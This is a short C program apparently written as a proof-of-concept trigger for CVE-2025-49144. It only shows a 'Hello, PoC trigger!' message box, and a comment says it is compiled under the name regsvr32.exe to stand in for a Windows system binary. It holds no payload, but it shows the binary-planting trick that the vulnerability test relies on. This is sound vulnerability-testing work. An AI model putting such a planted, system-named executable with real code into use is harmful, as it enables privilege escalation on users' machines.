#include <windows.h>

// poc for test cve-2025-49144, compiled name regsvr32.exe
int main() {
    MessageBoxA(NULL, "Hello, PoC trigger!", "Greeting", MB_OK | MB_ICONINFORMATION);
}